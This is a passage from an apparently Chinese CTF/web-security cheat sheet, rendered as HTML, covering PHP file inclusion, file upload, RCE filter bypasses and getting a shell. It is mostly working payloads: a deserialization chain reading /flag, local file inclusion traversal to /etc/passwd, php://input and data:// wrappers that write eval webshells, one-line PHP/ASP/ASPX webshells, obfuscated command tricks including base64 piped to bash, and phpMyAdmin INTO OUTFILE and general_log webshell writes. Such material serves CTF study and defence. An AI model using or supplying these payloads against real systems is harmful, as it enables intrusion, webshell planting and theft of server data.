data-num=\"17\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">light</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">-></span><span class=\"token property\">light</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">-></span><span class=\"token property\">dark</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64/resource=/flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h1 id=\"文件包含漏洞\"><a class=\"anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmVrZXI2Mi9wLzE1MzIyNzcxLmh0bWw=\">PHP 文件包含漏洞全面总结</span></p>\n<p>PHP 文件包含函数：</p>\n<p><code>include()</code> 、 <code>include_once()</code> 、 <code>require()</code> 、 <code>require_once()</code></p>\n<p><strong>无限制本地文件包含漏洞</strong>：未对读取规则设置 <code>前缀路径/拓展名</code> ，可任意构造路径录取</p>\n<ul>\n<li>目录遍历： <code>http://www.abc.com/flie.php?file=../../../../etc/passwd</code></li>\n<li>可执行任意拓展名文件中的代码</li>\n</ul>\n<p><strong>有限制本地文件包含漏洞</strong></p>\n<ul>\n<li><code>%00截断bypass(误把它当成结束符，后面的数据直接忽略)</code> ： <code>magic_quotes_gpc=off</code> ， <code>PHP版本低于5.3.4</code></li>\n<li><code>路径长度截断bypass</code> ：叠加 <code>./</code>  增长路径， <code>Windows</code>  最长 <code>256B</code> ， <code>Linux</code>  最长 <code>4096B</code></li>\n<li><code>点号截断bypass</code> ：只适用 <code>Windows</code>  系统，点号的长度大于 <code>256B</code>  造成拓展名截断</li>\n</ul>\n<p><strong>PHP 伪协议</strong></p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th style=\"text-align:left\">用法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>php://filter</code></td>\n<td style=\"text-align:left\"><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code></td>\n<td>元封装器，设计用于数据流打开时筛选过滤应用，对本地磁盘文件进行读写</td>\n</tr>\n<tr>\n<td><code>php://input</code></td>\n<td style=\"text-align:left\"><code>?file=php://input</code> ，POST 传入木马，①写入木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> ，②命令执行 <code>&lt;?php system('ls');?&gt;</code></td>\n<td><code>allow_url_include=on</code> ， <code>enctype=&quot;multipart/form-data&quot;</code>  时无效</td>\n</tr>\n<tr>\n<td><code>file://</code></td>\n<td style=\"text-align:left\"><code>?file=file://c:/boot.ini</code></td>\n<td>直接读取本地文件的内容</td>\n</tr>\n<tr>\n<td><code>data://</code></td>\n<td style=\"text-align:left\">① <code>?file=data://text/plain,&lt;?php phpinfo();?&gt;</code> ②Base64 编码 <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></td>\n<td><code>allow_url_fopen=on</code> , <code>allow_url_include=on</code></td>\n</tr>\n<tr>\n<td><code>phar://</code></td>\n<td style=\"text-align:left\"><code>?file=phar://压缩包/解压文件</code> ， <code>?file=phar://shell.png/shell.php</code> ，任意拓展名都解析为压缩包</td>\n<td>对 zip 协议压缩的伪装 shell 文件进行解压， <code>allow_url_fopen=on</code> , <code>allow_url_include=on</code> , <code>PHP&gt;=5.3.0</code></td>\n</tr>\n<tr>\n<td><code>zip://</code></td>\n<td style=\"text-align:left\"><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code> ， <code>url编码#为%23</code> ， <code>?file=zip://D:/phpstudy/www/.../test.png%23shell.php (zip必须是绝对路径)</code></td>\n<td>压缩， <code>allow_url_fopen=on</code> , <code>allow_url_include=on</code> , <code>PHP&gt;=5.3.0</code></td>\n</tr>\n<tr>\n<td><code>expect://</code></td>\n<td style=\"text-align:left\"><code>?file=expect://ls</code></td>\n<td>执行系统命令，需要安装拓展</td>\n</tr>\n</tbody>\n</table>\n<p><code>php://filter</code>  筛选过滤应用</p>\n<p>1、字符串过滤器：</p>\n<ul>\n<li><code>string.rot13</code>  对字符串执行 ROT13 转换</li>\n<li><code>string.toupper</code>  转换为大写</li>\n<li><code>string.tolower</code>  转换为小写</li>\n<li><code>string.strip</code> _tags 去除 <code>html</code>  和 <code>php</code>  标记</li>\n</ul>\n<p>2、转换过滤器：</p>\n<ul>\n<li><code>convert.base64-encode &amp; convert.base64-decode</code>  ： <code>base64编码/解码</code></li>\n<li><code>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</code> ：将  <code>quoted-printable</code>  字符串转换为  <code>8-bit </code> 字符串</li>\n</ul>\n<p>3、压缩过滤器：</p>\n<ul>\n<li><code>zlib.deflate</code>  和 <code>zlib.inflate</code></li>\n<li><code>bzip2.compress</code>  和 <code>bzip2.decompress</code></li>\n</ul>\n<p>4、 加密过滤器：</p>\n<ul>\n<li><code>mcrypt.tripledes</code>  和 <code>mdecrypt.tripledes</code>  等</li>\n</ul>\n<h1 id=\"文件上传漏洞\"><a class=\"anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h1>\n<p><strong>木马</strong></p>\n<ol>\n<li><code>&lt;?php phpinfo(); ?&gt;</code></li>\n<li><code>&lt;?php eval($_POST['a']); ?&gt;</code></li>\n<li><code>asp：&lt;%eval request (&quot;pass&quot;)%&gt;</code></li>\n<li><code>aspx： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></li>\n</ol>\n<p><strong>绕过手法</strong></p>\n<ol>\n<li>改可运行的其他后缀 (bp 抓包修改)  例如：phtml</li>\n</ol>\n<h1 id=\"rce漏洞\"><a class=\"anchor\" href=\"#rce漏洞\">#</a> RCE 漏洞</h1>\n<p><strong>命令</strong></p>\n<p><code>system(&quot;whoami&quot;)</code> ， <code>system(&quot;ls&quot;)</code> ， <code>system(&quot;ls /&quot;)</code> ， <code>system(&quot;cat /flag&quot;)</code></p>\n<p><strong>绕过手法</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>拼接法</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token operator\">=</span>fl<span class=\"token punctuation\">;</span>b<span class=\"token operator\">=</span>ag<span class=\"token punctuation\">;</span>cat$IFS$a$b</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤空格</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>换行<span class=\"token operator\">%</span>0a<span class=\"token punctuation\">,</span>回车<span class=\"token operator\">%</span>0d<span class=\"token punctuation\">,</span>Tab<span class=\"token operator\">%</span><span class=\"token number\">09</span>（url传递）cat<span class=\"token operator\">%</span>09flag<span class=\"token punctuation\">.</span>php <span class=\"token operator\">/</span> system<span class=\"token operator\">%</span>0a<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$<span class=\"token punctuation\">&#123;</span>IFS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$IFS$<span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;></span>（cat<span class=\"token operator\">&lt;></span><span class=\"token operator\">/</span>flag）</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">&lt;</span>（cat<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>flag）</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span>cat<span class=\"token punctuation\">,</span><span class=\"token operator\">/</span>flag<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤<span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>采用多管道命令绕过</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token operator\">|</span><span class=\"token operator\">|</span>cd flag_is_here<span class=\"token punctuation\">;</span>cat flag_262431433226364<span class=\"token punctuation\">.</span>php</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>echo $<span class=\"token punctuation\">&#123;</span>PATH<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤cat</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>替换<span class=\"token punctuation\">(</span>tac<span class=\"token punctuation\">,</span>more<span class=\"token punctuation\">,</span>bzmore<span class=\"token punctuation\">,</span>less<span class=\"token punctuation\">,</span>bzless<span class=\"token punctuation\">,</span>head<span class=\"token punctuation\">,</span>tail<span class=\"token punctuation\">,</span>nl<span class=\"token punctuation\">,</span>sed p<span class=\"token punctuation\">,</span>sort<span class=\"token punctuation\">,</span>uniq<span class=\"token punctuation\">,</span>rev<span class=\"token punctuation\">,</span>od<span class=\"token punctuation\">,</span>vim<span class=\"token punctuation\">,</span>vi<span class=\"token punctuation\">,</span>man<span class=\"token punctuation\">,</span>paste<span class=\"token punctuation\">,</span>grep <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">file</span> <span class=\"token operator\">-</span>f<span class=\"token punctuation\">,</span>dd <span class=\"token keyword\">if</span><span class=\"token operator\">=</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span>即可</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>报错读取<span class=\"token punctuation\">(</span>URL编码<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>date <span class=\"token operator\">-</span>f <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>有读取权限a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span> <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>有执行权限a<span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>echo $a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>比较diff <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span> <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>过滤flag文件名</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">/</span>f<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token operator\">/</span>f???<span class=\"token punctuation\">,</span><span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token operator\">-</span>q<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ca<span class=\"token string\">''</span> <span class=\"token operator\">/</span><span class=\"token string-interpolation\"><span class=\"token string\">f''</span></span>lag<span class=\"token punctuation\">,</span>cat\\t <span class=\"token operator\">/</span>f\\lag<span class=\"token punctuation\">,</span>cat<span class=\"token string\">\"\"</span> <span class=\"token operator\">/</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"</span></span>lag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>cat <span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token string\">'\\146\\154\\141\\147'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>echo <span class=\"token string\">\"Y2F0IC9mKg==\"</span> <span class=\"token operator\">|</span> base64 <span class=\"token operator\">-</span>d<span class=\"token operator\">|</span>bash</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php无参<span class=\"token constant\">RCE</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>jiang<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> 或者<span class=\"token function\">readgzfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>修改Cookie <span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span> filename 或 <span class=\"token operator\">/</span>flag</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>抓包传入Cookie<span class=\"token punctuation\">:</span> <span class=\"token constant\">PHPSESSID</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"system('命令')\"</span>的十六进制<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>当前目录：<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>上级目录文件：<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIyNDI/dGltZV9fMTMxMT1tcW1oRDVZSU1EN0drRGxjJTJCRUhmeGZnekRubTVLU2VEJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJGeHouYWxpeXVuLmNvbSUyRnQlMkYxMjQzMSUzRnRpbWVfXzEzMTElM0RtcW1oRDVBS0RJeEl4Q3FHWHBlZXFuVWJEa0dxRDh0Q0R4UEQlMjZhbGljaGxncmVmJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkY=\">利用 shell 脚本变量构造无字母数字命令</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTM2MD90aW1lX18xMzExPW40JTJCeHVEZ0Q5RHlpR1FZRFFORHNSMzJveGNEMG9oQXFXRCZhbXA7YWxpY2hsZ3JlZj1odHRwcyUzQSUyRiUyRmxpbmsuY3Nkbi5uZXQlMkYlM0Z0YXJnZXQlM0RodHRwcyUyNTNBJTI1MkYlMjUyRnh6LmFsaXl1bi5jb20lMjUyRnQlMjUyRjkzNjA=\">PHP 无参数 RCE</span></p>\n<h1 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h1>\n<h2 id=\"php-2\"><a class=\"anchor\" href=\"#php-2\">#</a> PHP</h2>\n<p><strong>preg_replace /e 模式 漏洞分析</strong></p>\n<p><code>preg_replace(str1,str2,$x)</code>  意为在变量 <code>$x</code>  中按照 <code>str1</code>  进行匹配，若匹配成功，则执行 <code>str2</code> ，与 <code>RCE漏洞</code> 打组合拳</p>\n<p><strong>PHP 反射机制利用</strong></p>\n<p>PHP 反射 API 由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。反射 API 是 PHP 内建的 OOP 技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。</p>\n<p><code>ReflectionClass</code>  通过类名获取类的信息； <code>ReflectionObject</code>  通过类的对象获取类的信息； <code>ReflectionMethod</code>  获取一个方法的有关信息。</p>\n<p><code>ReflectionException</code>  类、 <code>ReflectionFunction</code>  类、 <code>ReflectionExtension</code>  类、 <code>ReflectionFunctionAbstract</code>  类 <code>ReflectionGenerator</code>  类、 <code>ReflectionParameter</code>  类、 <code>ReflectionProperty</code>  类、 <code>ReflectionType</code>  类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$reflectionObject</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReflectionObject</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$reflectionObject</span><span class=\"token operator\">-></span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span><span class=\"token operator\">-></span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span><span class=\"token operator\">-></span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"‮⁦  //how to change the private variables⁩⁦secret\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$reflectionObject</span><span class=\"token operator\">-></span><span class=\"token function\">getProperty</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span><span class=\"token operator\">-></span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$reflectionProperty</span><span class=\"token operator\">-></span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cat /f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"getshell\"><a class=\"anchor\" href=\"#getshell\">#</a> Getshell</h1>\n<h2 id=\"phpmyadmin系统\"><a class=\"anchor\" href=\"#phpmyadmin系统\">#</a> phpmyadmin 系统</h2>\n<p><strong>1.into outfile 导出木马</strong></p>\n<ol>\n<li><code>select @@basedir;</code>   查看网站路径</li>\n<li><code>select '&lt;?php eval($_POST[cmd]);?&gt;' into outfile 'C:/phpStudy/www/hack.php';</code>    直接将木马写入到 www 网站根目录下</li>\n<li><code>show global variables like '%secure%';</code>   查看参数 secure_file_priv（该参数用来限制导入导出，会对读写文件产生影响，当 secure_file_priv 为 NULL 时，表示限制 Mysql 不允许导入导出）</li>\n</ol>\n<p><strong>2. 利用 Mysql 日志文件 getshell (开启全局日志)</strong></p>\n<ol>\n<li><code>show variables like '%general%';</code>    查看日志状态</li>\n<li><code>SET GLOBAL general_log='on'</code>    开启 general_log</li>\n<li><code>SET GLOBAL general_log_file='C:/phpStudy/www/hack.php'</code>    设置⽇志⽬录为 shell 地址，查询后日志中有 shell 语句</li>\n<li><code>SELECT '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'</code>    写入 shell</li>\n<li>直接蚁剑连接 http://192.168.200.128/hack.php</li>\n</ol>\n<h1 id=\"shell升级\"><a class=\"anchor\" href=\"#shell升级\">#</a> shell 升级</h1>\n<h2 id=\"半交互型shell\"><a class=\"anchor\" href=\"#半交互型shell\">#</a> 半交互型 shell</h2>\n<p>问题：vi 编辑文件不方便；命令行上下左右乱码；不能补全</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cd <span class=\"token operator\">/</span>tmp     需要在tmp目录下执行</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行tty，创建一个原生的终端，实现更直观和自然的交互。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Which python——发现存在python环境</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span>     <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>将shell进行tty</pre></td></tr></table></figure><h2 id=\"完全型交互shell\"><a class=\"anchor\" href=\"#完全型交互shell\">#</a> 完全型交互 shell</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>检查一下 python 的可用性 which python python2 python3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>python3 <span class=\"token operator\">-</span>c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>设置环境变量 </pre></td></tr><tr><td 